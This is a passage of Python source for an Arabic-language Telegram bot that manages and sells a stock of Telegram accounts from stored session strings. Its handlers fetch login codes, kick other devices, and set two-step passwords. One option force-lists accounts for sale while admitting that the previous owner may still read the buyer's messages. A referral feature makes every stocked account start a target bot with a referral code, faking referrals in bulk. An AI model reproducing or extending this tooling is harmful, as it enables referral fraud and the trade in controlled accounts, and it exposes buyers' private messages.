            kb_rows = [
                [InlineKeyboardButton("📋 تفاصيل الأجهزة وتواريخ التسجيل", callback_data=f"os:number_devices:{stock_id}")],
                [InlineKeyboardButton("🔑 جلب آخر كود دخول", callback_data=f"os:number_code:{stock_id}")],
                [InlineKeyboardButton("🔐 كلمة مرور التحقق بخطوتين", callback_data=f"os:number_2fa:{stock_id}")],
                [InlineKeyboardButton("⏱ سماح 5 دقائق (طرد باقي الجلسات فوراً)", callback_data=f"os:allow_5min:{rec['phone_number']}")],
            ]
            if not rec["sessions_reset"] and not rec["force_listed"]:
                kb_rows.append([InlineKeyboardButton("🚀 عرض مباشر للبيع الآن (تجاوز الانتظار)", callback_data=f"os:force_list:{stock_id}")])
            kb_rows.append([InlineKeyboardButton("🚪 تسجيل خروج البوت من هذا الحساب", callback_data=f"os:number_logout:{stock_id}")])
            kb_rows.append([InlineKeyboardButton("🗑 نقل إلى سلة المهملات", callback_data=f"os:number_delete:{stock_id}")])
            kb_rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")])
            await q.edit_message_text(
                text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup(kb_rows)
            )
        except Exception as e:
            _err_str = str(e)
            logger.error(f"❌ خطأ في جلب معلومات الرقم {rec['phone_number']}: {_err_str}")
            # ─── رسائل خطأ واضحة حسب نوع الخطأ ───
            if any(k in _err_str.lower() for k in ("auth_key_unregistered", "session_revoked", "user_deactivated", "deactivated_ban")):
                _err_msg = "🔒 الجلسة ألغيت أو الحساب محظور نهائياً من تيليجرام."
            elif "flood" in _err_str.lower():
                _err_msg = "⏳ تيليجرام يطلب الانتظار (FloodWait). حاول بعد دقائق."
            elif "network" in _err_str.lower() or "connect" in _err_str.lower():
                _err_msg = "🌐 تعذّر الاتصال بتيليجرام. تحقق من الشبكة وحاول مجدداً."
            else:
                _err_msg = f"❌ خطأ غير متوقع:\n`{_err_str[:200]}`"
            await q.edit_message_text(
                f"⚠️ *تعذّر جلب معلومات {rec['phone_number']}*\n\n{_err_msg}",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 إعادة المحاولة", callback_data=f"os:number_info:{stock_id}")],
                    [InlineKeyboardButton("🗑 نقل إلى سلة المهملات", callback_data=f"os:number_delete:{stock_id}")],
                    [InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")],
                ])
            )
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass
        return

    if data.startswith("os:force_list:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec or rec["assigned_to"] is not None:
            await q.edit_message_text(
                "⚠️ هذا الرقم غير متاح (تم بيعه أو حذفه).",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")]])
            )
            return
        set_force_listed(stock_id)
        await q.edit_message_text(
            f"🚀 *تم تفعيل العرض المباشر*\n\n"
            f"📱 {rec['phone_number']} أصبح الآن متاحاً للبيع والتسليم التلقائي فوراً، "
            "حتى لو لم ينتهِ طرد الجلسات الأخرى بعد.\n\n"
            "⚠️ تنبيه: إذا كانت هناك جلسة قديمة لصاحب الرقم السابق لم تُطرد بعد، فقد يبقى بإمكانه رؤية رسائل المشتري الجديد "
            "حتى تنجح إعادة المحاولة التلقائية بالخلفية.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")]])
        )
        return

    # ─── تسجيل خروج البوت من حساب محدد ───
    if data.startswith("os:number_logout:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec or not rec.get("session_string"):
            await q.edit_message_text(
                "⚠️ لا تتوفر جلسة لهذا الرقم.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")]])
            )
            return
        # ─── خطوة تأكيد قبل التنفيذ ───
        await q.edit_message_text(
            f"🚪 *تسجيل خروج البوت من:* `{rec['phone_number']}`\n\n"
            "⚠️ هذا سيُلغي جلسة البوت الحالية على هذا الحساب نهائياً.\n"
            "بعد الخروج: الرقم لن يكون قابلاً للبيع حتى تُضاف جلسة جديدة.\n\n"
            "هل أنت متأكد؟",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ نعم، سجّل خروج", callback_data=f"os:number_logout_confirm:{stock_id}")],
                [InlineKeyboardButton("🔙 إلغاء", callback_data=f"os:number_info:{stock_id}")],
            ])
        )
        return

    if data.startswith("os:number_logout_confirm:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec or not rec.get("session_string"):
            await q.edit_message_text(
                "⚠️ لا تتوفر جلسة لهذا الرقم.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")]])
            )
            return
        phone = rec["phone_number"]
        await q.edit_message_text(f"⏳ يتم تسجيل الخروج من {phone}...")
        # ─── أوقف المراقبة أولاً ───
        try:
            await _stop_number_monitor(phone)
        except Exception:
            pass
        # ─── سجّل خروج عبر Telethon ───
        _logout_ok   = False
        _logout_note = ""
        client_lo = TelegramClient(StringSession(rec["session_string"]), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        try:
            await asyncio.wait_for(client_lo.connect(), timeout=15)
            authorized = await asyncio.wait_for(client_lo.is_user_authorized(), timeout=8)
            if authorized:
                await client_lo.log_out()
                _logout_ok   = True
                _logout_note = "تم تسجيل الخروج وإلغاء الجلسة بنجاح."
            else:
                _logout_ok   = True
                _logout_note = "الجلسة كانت منتهية مسبقاً (لا داعي للخروج)."
        except asyncio.TimeoutError:
            _logout_note = "⚠️ انتهت مهلة الاتصال — تم مسح الجلسة محلياً فقط."
        except Exception as _le:
            _logout_note = f"⚠️ خطأ أثناء تسجيل الخروج: `{str(_le)[:120]}`\nتم مسح الجلسة من قاعدة البيانات."
        finally:
            try:
                await client_lo.disconnect()
            except Exception:
                pass
        # ─── امسح الجلسة من DB في جميع الحالات ───
        try:
            with db_conn() as _lc:
                _lc.execute(
                    "UPDATE number_stock SET session_string=NULL, sessions_reset=FALSE, "
                    "force_listed=FALSE, auto_2fa_enabled=FALSE WHERE id=%s",
                    (stock_id,)
                )
        except Exception as _dbe:
            logger.error(f"❌ فشل مسح الجلسة من DB للرقم {phone}: {_dbe}")
        await q.edit_message_text(
            f"🚪 *تسجيل خروج — {phone}*\n\n"
            f"{'✅' if _logout_ok else '⚠️'} {_logout_note}\n\n"
            "📌 الجلسة مُحذوفة من قاعدة البيانات.\n"
            "الرقم انتقل لحالة *يدوي* (بلا جلسة) ولن يُعرض للبيع.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🗑 نقل إلى سلة المهملات", callback_data=f"os:number_delete:{stock_id}")],
                [InlineKeyboardButton("🔙 رجوع لقائمة الأرقام", callback_data="os:list_numbers")],
            ])
        )
        return

    if data.startswith("os:number_delete:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec:
            await q.edit_message_text(
                "⚠️ لم يُعثر على هذا الرقم.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")]])
            )
            return
        soft_delete_number(stock_id)
        await q.edit_message_text(
            f"🗑 تم نقل الرقم `{rec['phone_number']}` إلى سلة المهملات.\n\n"
            "يمكنك استعادته في أي وقت من 🗑 سلة المهملات.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع لقائمة الأرقام", callback_data="os:list_numbers")]])
        )
        return

    if data.startswith("os:number_restore:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec:
            await q.edit_message_text(
                "⚠️ لم يُعثر على هذا الرقم.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:nums:trash")]])
            )
            return
        restore_deleted_number(stock_id)
        await q.edit_message_text(
            f"♻️ تم استعادة الرقم `{rec['phone_number']}` من سلة المهملات.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع لقائمة الأرقام", callback_data="os:list_numbers")]])
        )
        return

    if data.startswith("os:number_purge:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec:
            await q.edit_message_text(
                "⚠️ لم يُعثر على هذا الرقم.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:nums:trash")]])
            )
            return
        phone_del = rec["phone_number"]
        try:
            await _stop_number_monitor(phone_del)
        except Exception:
            pass
        permanently_delete_number(stock_id)
        await q.edit_message_text(
            f"🗑 تم حذف الرقم `{phone_del}` نهائياً من قاعدة البيانات.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع لسلة المهملات", callback_data="os:nums:trash")]])
        )
        return

    # ─── تفاصيل الأجهزة مع تواريخ التسجيل ───
    if data.startswith("os:number_devices:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec or not rec["session_string"]:
            await q.edit_message_text(
                "⚠️ لا تتوفر جلسة لهذا الرقم.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:number_info:{stock_id}")]])
            )
            return
        await q.edit_message_text(f"⏳ يتم جلب قائمة الأجهزة لـ {rec['phone_number']}...")
        client = TelegramClient(StringSession(rec["session_string"]), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        try:
            await client.connect()
            devices = await get_authorizations_detail(client)
            if not devices:
                await q.edit_message_text(
                    "⚠️ لم يتم جلب أي جهاز (ربما الحساب جامد أو الجلسة منتهية).",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:number_info:{stock_id}")]])
                )
                return
            lines = [f"📱 *{rec['phone_number']}* — {len(devices)} جهاز مسجّل\n"]
            kb_rows = []
            for i, d in enumerate(devices, 1):
                created = d["date_created"]
                active  = d["date_active"]
                created_str = created.strftime("%Y-%m-%d %H:%M") if hasattr(created, "strftime") else str(created)
                active_str  = active.strftime("%Y-%m-%d %H:%M")  if hasattr(active,  "strftime") else str(active)
                current_tag = " *(الجهاز الحالي — البوت)*" if d["current"] else ""
                lines.append(
                    f"*{i}.* {d['device']} — {d['app']}{current_tag}\n"
                    f"   🌍 {d['country']}  |  📅 سُجِّل: {created_str}\n"
                    f"   🕑 آخر نشاط: {active_str}\n"
                )
                if not d["current"]:
                    # زر طرد هذا الجهاز تحديداً
                    kb_rows.append([InlineKeyboardButton(
                        f"🚫 طرد الجهاز {i}: {d['device'][:30]}",
                        callback_data=f"os:kick_device:{stock_id}:{d['hash']}"
                    )])
            kb_rows.append([InlineKeyboardButton("🔙 رجوع", callback_data=f"os:number_info:{stock_id}")])
            await q.edit_message_text(
                "\n".join(lines),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup(kb_rows)
            )
        except Exception as e:
            logger.error(f"❌ خطأ في جلب الأجهزة للرقم {rec['phone_number']}: {e}")
            await q.edit_message_text(
                "❌ حدث خطأ أثناء جلب الأجهزة.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:number_info:{stock_id}")]])
            )
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass
        return

    # ─── طرد جهاز محدد بالـ hash ───
    if data.startswith("os:kick_device:") and is_own:
        parts = data.split(":")
        # format: os:kick_device:{stock_id}:{hash}
        stock_id    = int(parts[2])
        device_hash = int(parts[3])
        rec = get_stock_number(stock_id)
        if not rec or not rec["session_string"]:
            await q.edit_message_text(
                "⚠️ لا تتوفر جلسة لهذا الرقم.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:number_info:{stock_id}")]])
            )
            return
        await q.edit_message_text("⏳ يتم طرد الجهاز...")
        client = TelegramClient(StringSession(rec["session_string"]), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        try:
            await client.connect()
            await client(ResetAuthorizationRequest(hash=device_hash))
            # تحقق من الأجهزة المتبقية
            remaining = await get_authorizations_detail(client)
            non_current = [d for d in remaining if not d["current"]]
            if not non_current:
                # كل الجلسات الأخرى طُردت
                with db_conn() as c:
                    c.execute("UPDATE number_stock SET sessions_reset=TRUE WHERE id=%s", (stock_id,))
            await q.edit_message_text(
                f"✅ *تم طرد الجهاز بنجاح!*\n\n"
                f"📱 {rec['phone_number']}\n"
                f"الأجهزة المتبقية الآن: {len(remaining)} "
                f"({'البوت فقط ✅' if not non_current else f'{len(non_current)} جهاز خارجي ⚠️'})",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📋 عرض الأجهزة المتبقية", callback_data=f"os:number_devices:{stock_id}")],
                    [InlineKeyboardButton("🔙 رجوع لمعلومات الرقم", callback_data=f"os:number_info:{stock_id}")],
                ])
            )
        except Exception as e:
            logger.error(f"❌ خطأ في طرد الجهاز للرقم {rec['phone_number']}: {e}")
            await q.edit_message_text(
                f"❌ تعذّر طرد الجهاز: {e}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:number_devices:{stock_id}")]])
            )
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass
        return

    if data.startswith("os:number_code:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec or rec["assigned_to"] is not None or not rec["session_string"]:
            await q.edit_message_text(
                "⚠️ هذا الرقم غير متاح الآن (تم بيعه أو لا يملك جلسة).",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")]])
            )
            return
        await q.edit_message_text(f"⏳ يتم جلب آخر كود لرقم {rec['phone_number']}...")
        client = TelegramClient(StringSession(rec["session_string"]), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        try:
            await client.connect()
            code_msg, code_date = await fetch_last_login_code(client)
            if code_msg:
                import datetime as _dt
                _now = _dt.datetime.now(_dt.timezone.utc)
                _msg_date = code_date
                if _msg_date and _msg_date.tzinfo is None:
                    _msg_date = _msg_date.replace(tzinfo=_dt.timezone.utc)
                _age_minutes = int((_now - _msg_date).total_seconds() // 60) if _msg_date else None
                _age_str = (
                    f"منذ {_age_minutes} دقيقة" if _age_minutes is not None and _age_minutes < 60
                    else f"منذ {_age_minutes // 60} ساعة" if _age_minutes is not None
                    else ""
                )
                _freshness = "🟢 طازج" if _age_minutes is not None and _age_minutes <= 10 else "🔴 قديم"
                text = (
                    f"🔑 *آخر رسالة من تيليجرام لرقم {rec['phone_number']}:*\n\n"
                    f"{code_msg}\n\n"
                    f"🕐 وصل {_age_str} — {_freshness}"
                )
            else:
                text = f"ℹ️ لا توجد أي رسالة كود حالياً لرقم {rec['phone_number']}."
            await q.edit_message_text(
                text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 تحديث", callback_data=f"os:number_code:{stock_id}")],
                    [InlineKeyboardButton("🔙 رجوع", callback_data=f"os:number_info:{stock_id}")],
                ])
            )
        except Exception as e:
            logger.error(f"❌ خطأ في جلب الكود للرقم {rec['phone_number']}: {e}")
            await q.edit_message_text(
                "❌ حدث خطأ أثناء جلب الكود. حاول مجدداً لاحقاً.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")]])
            )
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass
        return

    if data.startswith("os:number_2fa:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec:
            await q.edit_message_text(
                "⚠️ الرقم غير موجود.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:list_numbers")]])
            )
            return
        saved_pwd = rec.get("twofa_password") or ""
        if saved_pwd:
            # عرض كلمة المرور المحفوظة
            await q.edit_message_text(
                f"🔐 *التحقق بخطوتين — {rec['phone_number']}*\n\n"
                f"✅ مفعّل\n"
                f"🗝 كلمة المرور: `{saved_pwd}`\n\n"
                "احتفظ بها في مكان آمن — ستحتاجها لو أردت تغييرها.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 إعادة تفعيل بكلمة مرور جديدة", callback_data=f"os:number_2fa_reset:{stock_id}")],
                    [InlineKeyboardButton("🔙 رجوع", callback_data=f"os:number_info:{stock_id}")],
                ])
            )
        else:
            # لم تُفعَّل بعد — عرض زر تفعيل فوري
            await q.edit_message_text(
                f"🔐 *التحقق بخطوتين — {rec['phone_number']}*\n\n"
                "❌ غير مفعّل بعد.\n\n"
                "اضغط التفعيل لتوليد كلمة مرور قوية وحفظها تلقائياً.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔐 تفعيل التحقق بخطوتين الآن", callback_data=f"os:number_2fa_enable:{stock_id}")],
                    [InlineKeyboardButton("🔙 رجوع", callback_data=f"os:number_info:{stock_id}")],
                ])
            )
        return

    if data.startswith("os:set_2fa_manual:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec:
            await q.edit_message_text("⚠️ الرقم غير موجود.")
            return
        context.user_data["state"] = "os_await_manual_2fa_pwd"
        context.user_data["manual_2fa_stock_id"] = stock_id
        await q.message.reply_text(
            f"🔑 أرسل الآن كلمة مرور التحقق بخطوتين الصحيحة لرقم `{rec['phone_number']}`:",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    if data.startswith("os:number_2fa_enable:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec or not rec.get("session_string"):
            await q.edit_message_text(
                "⚠️ لا يمكن تفعيل التحقق — الرقم بلا جلسة.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:number_info:{stock_id}")]])
            )
            return
        await q.edit_message_text(f"⏳ جاري تفعيل التحقق بخطوتين لرقم {rec['phone_number']}...")
        ok, msg_2fa, pwd_2fa = await enable_2fa_for_number(
            rec["phone_number"], rec["session_string"], stock_id, bot=context.bot
        )
        if ok and pwd_2fa:
            await q.edit_message_text(
                f"✅ *تم تفعيل التحقق بخطوتين بنجاح!*\n\n"
                f"📱 {rec['phone_number']}\n"
                f"🗝 كلمة المرور: `{pwd_2fa}`\n\n"
                "تم حفظها تلقائياً وستظهر دائماً في معلومات الرقم.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:number_info:{stock_id}")]])
            )
        else:
            await q.edit_message_text(
                f"❌ *فشل تفعيل التحقق بخطوتين*\n\n{msg_2fa}",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:number_info:{stock_id}")]])
            )
        return

    if data.startswith("os:number_2fa_reset:") and is_own:
        stock_id = int(data.split(":")[-1])
        rec = get_stock_number(stock_id)
        if not rec or not rec.get("session_string"):
            await q.edit_message_text(
                "⚠️ لا يمكن إعادة التفعيل — الرقم بلا جلسة.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:number_2fa:{stock_id}")]])
            )
            return
        current_pwd = rec.get("twofa_password") or ""
        if not current_pwd:
            # لا توجد كلمة مرور محفوظة → فقط فعّل جديدة
            await q.edit_message_text(f"⏳ جاري تفعيل التحقق بخطوتين لرقم {rec['phone_number']}...")
            ok, msg_2fa, pwd_2fa = await enable_2fa_for_number(
                rec["phone_number"], rec["session_string"], stock_id, bot=context.bot
            )
        else:
            # يجب تغيير كلمة المرور الموجودة باستخدام الكلمة الحالية
            await q.edit_message_text(f"⏳ جاري تغيير كلمة مرور التحقق لرقم {rec['phone_number']}...")
            client2 = TelegramClient(
                StringSession(rec["session_string"]),
                int(TELEGRAM_API_ID), TELEGRAM_API_HASH
            )
            try:
                await client2.connect()
                new_pwd = generate_2fa_password()
                _expected_2fa_change[rec["phone_number"]] = time.time()
                await client2.edit_2fa(
                    current_password=current_pwd,
                    new_password=new_pwd,
                    hint="Auto",
                )
                with db_conn() as c:
                    c.execute("UPDATE number_stock SET twofa_password=%s WHERE id=%s", (new_pwd, stock_id))
                ok, msg_2fa, pwd_2fa = True, "تم", new_pwd
            except Exception as e2:
                ok, msg_2fa, pwd_2fa = False, str(e2)[:120], None
            finally:
                try: await client2.disconnect()
                except Exception: pass
        if ok and pwd_2fa:
            await q.edit_message_text(
                f"✅ *تم تغيير كلمة المرور بنجاح!*\n\n"
                f"📱 {rec['phone_number']}\n"
                f"🗝 كلمة المرور الجديدة: `{pwd_2fa}`",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:number_info:{stock_id}")]])
            )
        else:
            await q.edit_message_text(
                f"❌ *فشل تغيير كلمة المرور*\n\n{msg_2fa}",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:number_2fa:{stock_id}")]])
            )
        return

    if data == "os:login_number" and is_own:
        if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
            await q.edit_message_text(
                "⚠️ *لم يتم إعداد الاتصال بعد*\n\n"
                "يجب إضافة `TELEGRAM_API_ID` و `TELEGRAM_API_HASH` كمتغيرات بيئة في Railway أولاً "
                "(تحصل عليهما من my.telegram.org بحسابك الشخصي)، ثم أعد المحاولة.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:manage_numbers")]])
            )
            return
        context.user_data["state"] = "os_await_login_phone"
        await q.edit_message_text(
            "🔑 *تسجيل دخول رقم جديد*\n\n"
            "أرسل رقم الهاتف بصيغة دولية كاملة، مثال:\n`+9647701234567`\n\n"
            "سيرسل تيليجرام كود تفعيل لهذا الرقم فوراً.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="os:manage_numbers")]])
        )
        return

    if data == "os:add_numbers" and is_own:
        context.user_data["state"] = "os_await_add_numbers"
        await q.edit_message_text(
            "➕ *إضافة أرقام للمخزون*\n\n"
            "أرسل الأرقام دفعة واحدة، رقم واحد في كل سطر (أو مفصولة بفاصلة)، مثال:\n\n"
            "`+9647701234567`\n`+9647709876543`\n\n"
            "سيتم تجاهل أي رقم مكرر موجود مسبقاً بالمخزون.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="os:manage_numbers")]])
        )
        return

    # ═══════════════════════════════════════════════════════════
    #  مهام الإحالة التلقائية — واجهة المالك
    # ═══════════════════════════════════════════════════════════

    if data == "os:ref_tasks" and is_own:
        tasks = get_referral_tasks()
        lines = ["🤝 *مهام الإحالة التلقائية*\n\n"]
        kb_rows = []
        if tasks:
            for t in tasks:
                stats = get_referral_task_stats(t["id"])
                st = "🟢" if t["active"] else "🔴"
                lines.append(
                    f"{st} *{t['label']}*\n"
                    f"   📌 @{t['bot_username']} | كود: `{t['start_param']}`\n"
                    f"   ✅ {stats['done']} | ❌ {stats['failed']} | ⏳ {stats['pending']}\n"
                )
                kb_rows.append([InlineKeyboardButton(
                    f"⚙️ {t['label']}", callback_data=f"os:ref_task:{t['id']}"
                )])
        else:
            lines.append("لا توجد مهام إحالة بعد. أضف أولى مهامك!")
        lines.append(
            "\n📌 *كيف تعمل؟*\n"
            "أضف مهمة إحالة بـ يوزر البوت وكود الإحالة، سيدخل كل رقم في مخزونك "
            "تلقائياً ويُرسل /start مع الكود كإحالة حقيقية (كأنه ضغط على رابط t.me/Bot?start=CODE)."
        )
        kb_rows.append([InlineKeyboardButton("➕ إضافة مهمة إحالة جديدة", callback_data="os:ref_task_add")])
        kb_rows.append([InlineKeyboardButton("🔙 رجوع", callback_data="os:manage_numbers")])
        await q.edit_message_text(
            "\n".join(lines),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(kb_rows)
        )
        return

    if data == "os:ref_task_add" and is_own:
        context.user_data["state"] = "os_await_ref_task_link"
        await q.edit_message_text(
            "🤝 *إضافة مهمة إحالة جديدة*\n\n"
            "أرسل رابط الإحالة كاملاً بهذا الشكل:\n\n"
            "`t.me/BotUsername?start=REFERRAL_CODE`\n\n"
            "أو أرسل اليوزر والكود منفصلَين بمسافة:\n"
            "`BotUsername REFERRAL_CODE`\n\n"
            "سيُكمل كل رقم في مخزونك هذه الإحالة تلقائياً.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 إلغاء", callback_data="os:ref_tasks")]])
        )
        return

    if data.startswith("os:ref_task:") and is_own:
        task_id = int(data.split(":")[-1])
        task = get_referral_task(task_id)
        if not task:
            await q.edit_message_text("⚠️ مهمة غير موجودة.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:ref_tasks")]]))
            return
        stats = get_referral_task_stats(task_id)
        pending_cnt = len(get_pending_numbers_for_task(task_id))
        status_icon = "🟢 نشطة" if task["active"] else "🔴 موقوفة"
        text = (
            f"⚙️ *{task['label']}*\n\n"
            f"📌 البوت: @{task['bot_username']}\n"
            f"🔑 كود الإحالة: `{task['start_param']}`\n"
            f"الحالة: {status_icon}\n\n"
            f"📊 *الإحصاء:*\n"
            f"✅ أكملت الإحالة: {stats['done']} رقم\n"
            f"❌ فشلت: {stats['failed']} رقم\n"
            f"⏳ معلّقة (لم تُنفَّذ بعد): {pending_cnt} رقم\n"
        )
        toggle_label = "🔴 إيقاف المهمة" if task["active"] else "🟢 تفعيل المهمة"
        await q.edit_message_text(
            text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("▶️ تشغيل الآن على كل الأرقام المعلّقة", callback_data=f"os:ref_run:{task_id}")],
                [InlineKeyboardButton(toggle_label, callback_data=f"os:ref_toggle:{task_id}")],
                [InlineKeyboardButton("🗑 حذف هذه المهمة", callback_data=f"os:ref_delete:{task_id}")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="os:ref_tasks")],
            ])
        )
        return

    if data.startswith("os:ref_toggle:") and is_own:
        task_id = int(data.split(":")[-1])
        new_active = toggle_referral_task(task_id)
        status = "مفعّلة 🟢" if new_active else "موقوفة 🔴"
        await q.answer(f"المهمة الآن {status}", show_alert=False)
        # أعد عرض صفحة المهمة
        context.user_data["_ref_task_redirect"] = task_id
        # استدعاء نفس الـ handler
        class _FakeData:
            def __init__(self, d): self.data = d
            async def edit_message_text(self, *a, **kw): return await q.edit_message_text(*a, **kw)
            async def answer(self, *a, **kw): return await q.answer(*a, **kw)
        update.callback_query.data = f"os:ref_task:{task_id}"
        # إعادة التوجيه اليدوية
        task = get_referral_task(task_id)
        if not task:
            await q.edit_message_text("⚠️ مهمة غير موجودة.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:ref_tasks")]]))
            return
        stats = get_referral_task_stats(task_id)
        pending_cnt = len(get_pending_numbers_for_task(task_id))
        status_icon = "🟢 نشطة" if task["active"] else "🔴 موقوفة"
        await q.edit_message_text(
            f"⚙️ *{task['label']}*\n\n"
            f"📌 البوت: @{task['bot_username']}\n"
            f"🔑 كود الإحالة: `{task['start_param']}`\n"
            f"الحالة: {status_icon}\n\n"
            f"📊 *الإحصاء:*\n"
            f"✅ أكملت الإحالة: {stats['done']} رقم\n"
            f"❌ فشلت: {stats['failed']} رقم\n"
            f"⏳ معلّقة (لم تُنفَّذ بعد): {pending_cnt} رقم\n",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("▶️ تشغيل الآن على كل الأرقام المعلّقة", callback_data=f"os:ref_run:{task_id}")],
                [InlineKeyboardButton("🔴 إيقاف المهمة" if task["active"] else "🟢 تفعيل المهمة", callback_data=f"os:ref_toggle:{task_id}")],
                [InlineKeyboardButton("🗑 حذف هذه المهمة", callback_data=f"os:ref_delete:{task_id}")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="os:ref_tasks")],
            ])
        )
        return

    if data.startswith("os:ref_run:") and is_own:
        task_id = int(data.split(":")[-1])
        task = get_referral_task(task_id)
        if not task:
            await q.edit_message_text("⚠️ مهمة غير موجودة.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="os:ref_tasks")]]))
            return
        if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
            await q.edit_message_text(
                "⚠️ يجب إضافة `TELEGRAM_API_ID` و `TELEGRAM_API_HASH` في Railway أولاً.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"os:ref_task:{task_id}")]])
            )
            return
        pending = get_pending_numbers_for_task(task_id)
        if not pending:
